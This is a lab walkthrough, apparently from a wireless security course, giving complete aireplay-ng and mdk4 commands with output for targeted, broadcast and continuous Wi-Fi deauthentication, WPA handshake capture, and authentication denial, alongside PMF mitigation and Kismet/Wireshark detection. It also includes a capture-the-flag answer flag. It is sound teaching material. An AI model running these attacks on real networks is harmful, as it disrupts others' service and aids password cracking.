# Lab 06: Deauthentication Attacks - Walkthrough

Complete step-by-step solution guide for deauthentication attacks.

```
+===============================================================+
|                    WALKTHROUGH GUIDE                           |
+===============================================================+
|  WARNING: This contains complete solutions.                   |
|  Try the exercises yourself first!                            |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  This walkthrough is for EDUCATIONAL PURPOSES ONLY.                 |
|                                                                      |
|  - Only perform these actions on YOUR OWN ISOLATED networks        |
|  - NEVER attack networks with other users                           |
|  - Deauthentication attacks can violate federal laws                |
|  - Disrupting wireless service can result in criminal charges       |
+=====================================================================+
```

## Lab Environment Setup

### Required Equipment

```
Isolated Test Environment:

┌─────────────────────────────────────────────────────────────────┐
│                    YOUR ISOLATED LAB                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   [Kali Linux]  ──── USB WiFi Adapter (Monitor/Injection)       │
│                                                                  │
│   [Test Router] ──── Your own router, NOT connected to internet │
│       │              SSID: TestDeauth                           │
│       │              Security: WPA2-PSK                         │
│       │                                                          │
│       ▼                                                          │
│   [Test Client] ──── Your own device (phone/laptop)             │
│                      Connected to TestDeauth                    │
│                                                                  │
│   IMPORTANT: No other devices or networks affected!             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Pre-Flight Checks

```bash
# Verify adapter supports injection
sudo aireplay-ng --test wlan0

# Expected output:
# 09:45:23  Trying broadcast probe requests...
# 09:45:23  Injection is working!

# If injection test fails, the deauth attack won't work
```

## Exercise 1: Basic Deauthentication - Complete Walkthrough

### Step 1: Enable Monitor Mode

```bash
# Check for interfering processes
sudo airmon-ng check

# Output example:
# Found 2 processes that could cause trouble.
#     PID Name
#     723 NetworkManager
#     912 wpa_supplicant

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Output:
# PHY     Interface       Driver          Chipset
# phy0    wlan0           rtl8812au       Realtek Semiconductor Corp.
#         (monitor mode enabled on wlan0mon)

# Verify
iwconfig wlan0mon
# Mode:Monitor should be displayed
```

### Step 2: Identify Target Network and Client

```bash
# Scan for your test network
sudo airodump-ng wlan0mon
```

**Sample Output:**
```
 CH  3 ][ Elapsed: 30 s ]

 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC    CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -35      312      189   15   6   54e  WPA2   CCMP    PSK  TestDeauth
 11:22:33:44:55:66  -72      145       45    3  11   54e  WPA2   CCMP    PSK  Neighbor_WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  DE:AD:BE:EF:CA:FE  -45   54e-54e      0      156
```

**Information to Record:**
- Your Test AP BSSID: `AA:BB:CC:DD:EE:FF`
- Channel: `6`
- Your Test Client MAC: `DE:AD:BE:EF:CA:FE`

### Step 3: Lock to Target Channel

```bash
# Start monitoring on target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

**Keep this running in Terminal 1 to observe the deauth effect!**

### Step 4: Perform Targeted Deauthentication

```bash
# Open Terminal 2
# Deauth your specific test client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c DE:AD:BE:EF:CA:FE wlan0mon
```

**Expected Output:**
```
10:15:23  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
10:15:23  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [ 0|62 ACKs]
10:15:23  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [56|63 ACKs]
10:15:24  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [62|65 ACKs]
10:15:24  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [58|62 ACKs]
10:15:24  Sending 64 directed DeAuth (code 7). STMAC: [DE:AD:BE:EF:CA:FE] [64|64 ACKs]
```

**Observe on Test Client:**
- WiFi disconnects briefly
- Reconnects automatically (usually within seconds)
- May show "Connection Lost" notification

### Step 5: Broadcast Deauthentication

```bash
# Deauth ALL clients (without -c flag)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Output:**
```
10:18:45  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
10:18:45  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
10:18:46  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
```

**Note:** Broadcast deauth shows 0 ACKs (no specific client to ACK).

### Step 6: Observe Results

**In Terminal 1 (airodump-ng):**
```
 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  DE:AD:BE:EF:CA:FE  -45   54e-54e    125    ← Lost increases!
```

The "Lost" column increases significantly during deauth attack.

## Exercise 2: Handshake Capture with Deauth

### Combined Attack Setup

```
Terminal Layout:
┌─────────────────────────┬─────────────────────────┐
│     Terminal 1          │     Terminal 2          │
│     (Capture)           │     (Deauth)            │
└─────────────────────────┴─────────────────────────┘
```

### Terminal 1: Start Capture

```bash
# Start capture with file output
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture wlan0mon

# Watch the top-right for: WPA handshake: AA:BB:CC:DD:EE:FF
```

### Terminal 2: Send Deauth

```bash
# Send deauth to force handshake
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c DE:AD:BE:EF:CA:FE wlan0mon
```

### Expected Result

**Terminal 1 shows:**
```
 CH  6 ][ Elapsed: 45 s ][ WPA handshake: AA:BB:CC:DD:EE:FF
                          ↑
                 Handshake captured!
```

### Verify Handshake

```bash
# Check handshake quality
aircrack-ng handshake_capture-01.cap

# Output:
# Opening handshake_capture-01.cap
# Read 5678 packets.
#
#    #  BSSID              ESSID                     Encryption
#
#    1  AA:BB:CC:DD:EE:FF  TestDeauth                WPA (1 handshake)
```

## Exercise 3: PMF Testing - Complete Walkthrough

### Enable PMF on Router

1. Access router admin panel (e.g., http://192.168.1.1)
2. Navigate to Wireless → Security Settings
3. Find "Protected Management Frames" or "802.11w"
4. Set to "Required" (or "Capable" for compatibility)
5. Save settings

**Note:** Not all routers support PMF. Check your router's specifications.

### Test Deauth Against PMF-Enabled Network

```bash
# Attempt deauth
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c DE:AD:BE:EF:CA:FE wlan0mon
```

**Expected Result with PMF:**
- Output still shows "Sending DeAuth"
- BUT the client does NOT disconnect!
- Client's connection remains stable

### Verify PMF Status

```bash
# Check network info with airodump-ng
sudo airodump-ng wlan0mon

# Look for additional flags in output
# Networks with PMF may show additional capabilities
```

## Exercise 4: Detect Deauth Attacks

### Using Kismet

```bash
# Install Kismet if not present
sudo apt install kismet

# Start Kismet
sudo kismet -c wlan0mon
```

**Access Web Interface:**
1. Open browser to http://localhost:2501
2. Default login: kismet / kismet
3. Navigate to "Alerts"

**During Deauth Attack, Kismet Shows:**
```
ALERT: DEAUTHFLOOD
  Source: DE:AD:BE:EF:12:34
  Target: AA:BB:CC:DD:EE:FF
  Channel: 6
  Packets: 128 in 5 seconds
```

### Using Wireshark

```bash
# Start Wireshark on monitor interface
sudo wireshark -i wlan0mon &
```

**Filter for Deauth Frames:**
```
wlan.fc.type_subtype == 0x0c
```

**During Attack:**
- Many deauth frames appear
- Note source MAC (often spoofed to be AP)
- Note reason code (typically 7)

### Analyze Deauth Frames in Wireshark

```
Sample Deauth Frame:

Frame 156: 26 bytes on wire
IEEE 802.11 Deauthentication
    Type: Management frame (0)
    Subtype: Deauthentication (12)
    Receiver address: de:ad:be:ef:ca:fe (Target client)
    Transmitter address: aa:bb:cc:dd:ee:ff (Spoofed as AP)
    BSS Id: aa:bb:cc:dd:ee:ff
    Reason code: Class 3 frame received from nonassociated STA (0x0007)
```

## Using mdk4 for Advanced Attacks

### Installation

```bash
sudo apt install mdk4
```

### Deauth Attack Mode

```bash
# Create target list
echo "AA:BB:CC:DD:EE:FF" > targets.txt

# Run deauth attack
sudo mdk4 wlan0mon d -c 6 -b targets.txt

# Parameters:
# d         : Deauthentication mode
# -c 6      : Channel 6
# -b        : Blacklist file (BSSIDs to attack)
```

### Authentication Denial Mode

```bash
# Prevent new authentications
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# Parameters:
# a         : Authentication denial mode
# -a        : Target AP BSSID
```

## Cleanup and Restoration

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Verify normal operation
iwconfig wlan0
# Should show: Mode:Managed

# Test connectivity
ping -c 3 google.com
```

## Troubleshooting

### "Injection not working"

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If fails:
# 1. Check adapter compatibility
# 2. Verify monitor mode is enabled
# 3. Try different USB port
# 4. Update drivers
```

### "0 ACKs" on Targeted Deauth

```bash
# This could mean:
# 1. Client is out of range
# 2. Wrong client MAC
# 3. PMF is enabled

# Verify client is connected
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Check if client MAC appears in STATION list
```

### "Client Reconnects Instantly"

This is normal behavior. Modern clients reconnect quickly.

```bash
# For handshake capture, this is desired!
# The reconnection provides the handshake

# For DoS testing (on your own network only):
# Use continuous deauth
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### "Attack Not Working Against Some Clients"

```
Possible reasons:
1. PMF (802.11w) enabled - attack is mitigated
2. Client is WPA3 - inherently resistant
3. Client is using 5GHz, you're attacking 2.4GHz channel
4. Firmware/driver resilience
```

## Summary

You've successfully learned:

1. **Monitor Mode Setup**: airmon-ng check kill && airmon-ng start
2. **Network Discovery**: Identifying targets with airodump-ng
3. **Targeted Deauth**: aireplay-ng -0 with -c for specific client
4. **Broadcast Deauth**: aireplay-ng -0 without -c
5. **Handshake Capture Integration**: Deauth + airodump-ng capture
6. **PMF Testing**: Understanding protection mechanisms
7. **Detection**: Using Kismet and Wireshark
8. **mdk4**: Alternative tool for deauth attacks

## Key Takeaways

```
┌──────────────────────────────────────────────────────────────────┐
│                    IMPORTANT LESSONS                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. Deauth attacks work because management frames lack auth      │
│  2. PMF (802.11w) mitigates these attacks                        │
│  3. WPA3 mandates PMF, making it resistant                       │
│  4. Detection is easy with proper monitoring                     │
│  5. ALWAYS use in controlled, isolated environments              │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

## Next Steps

Continue to [Lab 07: Evil Twin Attacks](../07-evil-twin-attacks/) to learn how deauth attacks are combined with rogue access points.

---

**Flag:** `FLAG{d34uth_4tt4ck}`
